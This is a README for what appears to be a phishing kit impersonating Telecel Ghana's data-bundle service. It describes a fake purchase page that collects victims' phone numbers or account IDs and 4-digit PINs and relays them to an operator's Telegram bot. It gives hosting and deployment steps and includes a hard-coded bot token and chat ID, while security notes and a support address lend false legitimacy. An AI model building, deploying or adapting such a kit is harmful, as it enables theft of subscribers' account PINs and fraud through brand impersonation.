# Telecel Data Bundles Website

A complete static website for Telecel data bundles with integrated Telegram bot authorization system.

## 📋 Contents

This package includes three HTML files:

1. **index.html** - Main homepage
2. **login.html** - Purchase authentication page
3. **verify.html** - Transaction confirmation page

## 🚀 Quick Start

### Option 1: Deploy on Web Hosting (Recommended)

1. Extract the zip file
2. Upload all three HTML files to your web hosting provider (Netlify, Vercel, GitHub Pages, etc.)
3. Set your homepage URL as the root domain
4. Test the complete flow

### Option 2: Run Locally

```bash
# Extract the zip file
unzip telecel_website.zip
cd telecel_static_site

# Python 3
python3 -m http.server 8000

# Python 2
python -m SimpleHTTPServer 8000

# Node.js (if installed)
npx http-server
```

Then open: `http://localhost:8000`

## 🔧 Configuration

### Update Telegram Bot Credentials

Edit **login.html** and find the CONFIG section (around line 171):

```javascript
const CONFIG = {
    BOT_TOKEN: '8625776173:AAE9XuhbvCy-Gp2d7GAbWLSp4c2sDUtExkw',  // ← Replace with your bot token
    CHAT_ID: '6573120346',                                          // ← Replace with your chat ID
    MIN_PHONE_LENGTH: 10,
    REDIRECT_PAGE: 'verify.html'
};
```

**How to get your Telegram Bot Token and Chat ID:**

1. Create a bot with [@BotFather](https://t.me/botfather) on Telegram
2. Get your bot token from BotFather
3. Send a message to your bot
4. Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
5. Find your chat ID in the response

## 📱 User Flow

1. **Homepage (index.html)**
   - Browse 5 data bundles
   - View benefits and testimonials
   - Read FAQ section
   - Click "Buy Now" on any bundle

2. **Login Page (login.html)**
   - Select account type (Mobile/Broadband)
   - Enter phone number or account ID
   - Enter 4-digit PIN
   - Submit for authorization

3. **Telegram Approval**
   - Admin receives message with purchase details
   - Two inline buttons: "Approve & Complete" or "Decline"
   - Click to approve or decline

4. **Verification (verify.html)**
   - Shows purchase confirmation
   - Displays transaction details
   - Option to download receipt
   - Link back to homepage

## 🎨 Customization

### Change Colors

Edit the CSS in each HTML file. Key colors:

- **Primary Red**: `#E30613`
- **Primary Blue**: `#0033A0`
- **Success Green**: `#27AE60`

### Update Bundle Prices

In **index.html**, find the bundle cards section and update:

```html
<div class="bundle-price">GHS 10</div>
<div class="bundle-data">10 GB</div>
```

### Modify Company Information

In **index.html** footer, update:

```html
<p>📞 Call: +233 (0) 501 234 567</p>
<p>📧 Email: support@telecel.com.gh</p>
<p>🏢 Office: Accra, Ghana</p>
```

## ✨ Features

- ✅ Fully responsive design (mobile, tablet, desktop)
- ✅ No external dependencies (pure HTML, CSS, JavaScript)
- ✅ Fast loading (all files are static)
- ✅ SEO-friendly structure
- ✅ Telegram bot integration with real-time polling
- ✅ Secure PIN handling (4-digit validation)
- ✅ Purchase data persistence (localStorage)
- ✅ Professional UI with smooth animations

## 🔒 Security Notes

- All data validation happens on the client side
- PIN is stored in localStorage (for demo purposes)
- For production, implement server-side validation and secure payment processing
- Never expose sensitive credentials in client-side code
- Use HTTPS for all deployments

## 📊 Browser Support

- Chrome/Edge (latest)
- Firefox (latest)
- Safari (latest)
- Mobile browsers (iOS Safari, Chrome Mobile)

## 🐛 Troubleshooting

### "Failed to send to Telegram" Error

1. Check your bot token is correct
2. Verify chat ID is correct
3. Ensure bot has permission to send messages
4. Check browser console for detailed error messages

### Bundle Not Showing on Login Page

1. Verify URL parameters: `login.html?bundle=10gb&price=10`
2. Check browser console for JavaScript errors
3. Clear browser cache and reload

### Telegram Polling Not Working

1. Ensure bot token and chat ID are correct
2. Check network tab in browser dev tools
3. Verify Telegram API is accessible from your location

## 📝 License

This website is provided as-is for Telecel Ghana.

## 📞 Support

For issues or questions, contact support@telecel.com.gh

---

**Version**: 1.0  
**Last Updated**: April 2026  
**Created for**: Telecel Ghana
